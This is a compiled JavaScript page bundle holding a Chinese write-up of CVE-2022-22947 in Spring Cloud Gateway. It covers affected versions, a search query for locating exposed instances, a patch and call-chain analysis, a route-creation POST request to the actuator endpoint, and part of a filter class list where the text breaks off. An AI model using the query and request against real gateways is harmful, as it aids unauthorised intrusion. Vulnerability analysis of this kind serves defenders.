(window.webpackJsonp=window.webpackJsonp||[]).push([[4],{1145:function(t,s,a){t.exports=a.p+"assets/img/1647573307526-2e0e8717-9a10-4305-b9f4-2d0ecc6f0b81.20722173.png"},1146:function(t,s,a){t.exports=a.p+"assets/img/1647573330085-566ca2e2-719a-488a-aaf6-42461c34123a.53dbdf47.png"},1147:function(t,s,a){t.exports=a.p+"assets/img/1647573348150-d8d6e878-6215-4f0f-9b1a-1bdfc10ace05.4cec52d8.png"},1148:function(t,s,a){t.exports=a.p+"assets/img/1647573359290-e7054815-361f-40f4-b079-73ca1558652c.8e62f8eb.png"},1149:function(t,s,a){t.exports=a.p+"assets/img/1647573373383-2db3fe98-8f67-4b6d-99a1-62078a426be4.406add6d.png"},1150:function(t,s,a){t.exports=a.p+"assets/img/1647573389339-bfd6ed2a-0a74-419b-879a-9b8e23714deb.9569cedf.png"},1151:function(t,s,a){t.exports=a.p+"assets/img/1647573404242-a29e06ef-0d7e-4c0c-a6d3-29e34a0e3eab.45110880.png"},1152:function(t,s,a){t.exports=a.p+"assets/img/1647573426047-9b408805-d6a9-426d-9953-3ad0688747b5.bfb885f6.png"},1153:function(t,s,a){t.exports=a.p+"assets/img/1647573440443-cfbaf262-a8ca-4455-a14d-c9289318b002.7585d684.png"},1154:function(t,s,a){t.exports=a.p+"assets/img/1647573460075-ec905926-3451-4543-b403-25406b2f80cd.ee0c0b1a.png"},1155:function(t,s,a){t.exports=a.p+"assets/img/1647573471856-84de7feb-84c0-43d4-a9dc-6a08ac81c085.4ab50fb2.png"},1156:function(t,s,a){t.exports=a.p+"assets/img/1647573500724-a690d7a7-8c6a-42bc-94ea-51909fe208ad.0bbcc03e.png"},1157:function(t,s,a){t.exports=a.p+"assets/img/1647573512207-7a45481a-fbe8-4f30-a54d-8be6301e3e20.17630b7f.png"},1158:function(t,s,a){t.exports=a.p+"assets/img/1647573523778-8db7a44f-3aa5-4936-b65e-d6e99a73139d.091ba86d.png"},1159:function(t,s,a){t.exports=a.p+"assets/img/1647573597584-9b9bc011-190f-4562-ac76-9e67d0b7945f.48f3da0c.png"},1160:function(t,s,a){t.exports=a.p+"assets/img/1647573625150-6beef741-5360-4a88-be27-bfbbba9d2664.f0585f18.png"},1161:function(t,s,a){t.exports=a.p+"assets/img/1647573637082-848734d6-27d1-49ba-a286-8b229ccd2796.ff3d11c9.png"},1162:function(t,s,a){t.exports=a.p+"assets/img/1647573647822-ba74606e-4f36-447c-be21-611899cd401f.26f93806.png"},1163:function(t,s,a){t.exports=a.p+"assets/img/1647573666113-f9fcd7ca-6fff-4527-829e-d07ca34db54d.a48b25e1.png"},1164:function(t,s,a){t.exports=a.p+"assets/img/1647573683357-9c3bcbb7-1e3a-45ab-b92d-0d1ada0f615d.ec7db3bd.png"},1165:function(t,s,a){t.exports=a.p+"assets/img/1647573785505-7c1037a5-d149-42a4-b792-f7e3f0a6276a.8683f38c.png"},1166:function(t,s,a){t.exports=a.p+"assets/img/1647573792434-78a09b7b-fd34-463b-85e4-fc9e1c887fab.59f8bc10.png"},1167:function(t,s,a){t.exports=a.p+"assets/img/1647573803599-990e0a0d-00ef-4a93-a5b1-e79a07cbe2a5.58cfed98.png"},1168:function(t,s,a){t.exports=a.p+"assets/img/1647573814295-a29abe86-bc09-435c-a7d4-04bc1ee9ba78.e476ba15.png"},1169:function(t,s,a){t.exports=a.p+"assets/img/1647573882630-988bce83-ebb7-4cb1-bedc-f64f13e1d7fb.f5d0ba89.png"},1170:function(t,s,a){t.exports=a.p+"assets/img/1647573890270-d0d7d0d6-480b-4077-a0b5-8288eeaf5c7d.c2fff973.png"},1171:function(t,s,a){t.exports=a.p+"assets/img/1647573902389-661a5cf0-e59b-4c70-8f77-0dc4281f6688.1e7d9f14.png"},1172:function(t,s,a){t.exports=a.p+"assets/img/1647573912918-962092be-759d-488b-bc77-b6960a4b2cab.b7349088.png"},1173:function(t,s,a){t.exports=a.p+"assets/img/1647573923086-32cab28a-86da-4cab-98fd-3405742b5d95.48d21200.png"},1174:function(t,s,a){t.exports=a.p+"assets/img/1647573937710-577aedc0-9571-4868-b4fc-fd753abe0de9.e5d2f333.png"},2286:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"spring-cloud-gateway表达式注入-远程命令执行漏洞-cve-2022-22947"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#spring-cloud-gateway表达式注入-远程命令执行漏洞-cve-2022-22947"}},[t._v("#")]),t._v(" Spring Cloud Gateway表达式注入 远程命令执行漏洞 CVE-2022-22947")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。")]),t._v(" "),n("p",[t._v("近日VMware官方发布了Spring Cloud Gateway存在SPEL表达式注入漏洞CVE-2022-22947，可导致未授权远程命令执行漏洞：")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Spring Cloud Gateway < 3.1.1")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Spring Cloud Gateway < 3.0.7")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Spring Cloud Gateway 其他已不再更新的版本")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("p",[t._v('app="vmware-SpringBoot-Framework"'),n("br")]),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("可以从Github下载存在漏洞的版本v3.1.0，然后用idea载入：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1145),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("从漏洞通报来看，这是一个SPEL表达式注入漏洞，对比补丁"),n("code",[t._v("org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue")]),t._v("：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1146),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1147),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("新版本将"),n("code",[t._v("getValue")]),t._v("函数中的"),n("code",[t._v("StandardEvaluationContext")]),t._v("替换成了"),n("code",[t._v("SimpleEvaluationContext")]),t._v("，从而修复了SPEL表达式注入。寻找"),n("code",[t._v("getValue")]),t._v("函数被调用的情况")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1148),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("只在枚举值"),n("code",[t._v("ShortcutType")]),t._v("的三个取值（"),n("code",[t._v("DEFAULT")]),t._v("、"),n("code",[t._v("GATHER_LIST")]),t._v("、"),n("code",[t._v("GATHER_LIST_TAIL_FLAG")]),t._v("）中被调用：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1149),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("三个调用类似，以"),n("code",[t._v("DEFAULT")]),t._v("为例，继续寻找调用关系：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1150),alt:"img"}})]),t._v(" "),n("p",[t._v("一直定位到"),n("code",[t._v("RouteDefinitionLocator#convertToRoute")]),t._v("：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1151),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("尝试根据"),n("code",[t._v("RouteDefinition")]),t._v("提取"),n("code",[t._v("GatewayFilter")]),t._v("列表。这里的调用和路由以及过滤规则有关，查看Spring Cloud Gateway路由相关的接口定义：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1152),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("定位处理控制器"),n("code",[t._v("org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint")]),t._v("：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1153),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("POST输入参数为"),n("code",[t._v("RouteDefinition")]),t._v("类型，与上面调用链中的"),n("code",[t._v("convertToRoute")]),t._v("函数的输入参数类型一致。")]),t._v(" "),n("p",[t._v("查看"),n("code",[t._v("RouteDefinition")]),t._v("定义：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1154),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("注意列表型变量"),n("code",[t._v("FilterDefinition")]),t._v("的定义：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1155),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("参考"),n("code",[t._v("RouteDefinition")]),t._v("变量的定义很容易出构造POST测试请求：")]),t._v(" "),n("div",{staticClass:"language-powershell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-powershell"}},[n("code",[t._v("POST "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("actuator/gateway/routes/123456 HTTP/1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\nHost: 127"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1:9000\nAccept-Encoding: gzip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept: "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAccept-Language: en\nUser-Agent: Mozilla/5"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Windows NT 10"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Win64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" x64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit/537"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("36 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("KHTML"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome/97"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("4692"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("71 Safari/537"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("36\nConnection: close\nContent-"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("Type")]),t._v(": application/json\nContent-Length: 166\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"id"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"id"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"filters"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"123456"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"args"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"uri"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://localhost"')]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br")])]),n("p",[t._v("触发断点：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1156),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("首先会通过函数"),n("code",[t._v("validateRouteDefinition")]),t._v("对参数进行了检查：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1157),alt:"img"}})]),t._v(" "),n("br"),t._v(" "),n("p",[t._v("进入验证函数"),n("code",[t._v("isAvailable")]),t._v("：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1158),alt:"img"}})]),t._v(" "),n("p",[t._v("代码中会验证"),n("code",[t._v("Filter")]),t._v("的"),n("code",[t._v("name")]),t._v("属性是否合法，合法列表整理如下：")]),t._v(" "),n("div",{staticClass:"language-powershell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-powershell"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("AddRequestHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("MapRequestHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("AddRequestParameterGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("AddResponseHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("rewrite"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ModifyRequestBodyGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DedupeResponseHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("rewrite"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ModifyResponseBodyGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("CacheRequestBodyGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("PrefixPathGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("PreserveHostHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RedirectToGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RemoveRequestHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RemoveRequestParameterGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RemoveResponseHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RewritePathGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RetryGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SetPathGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SecureHeadersGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SetRequestHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SetRequestHostHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" 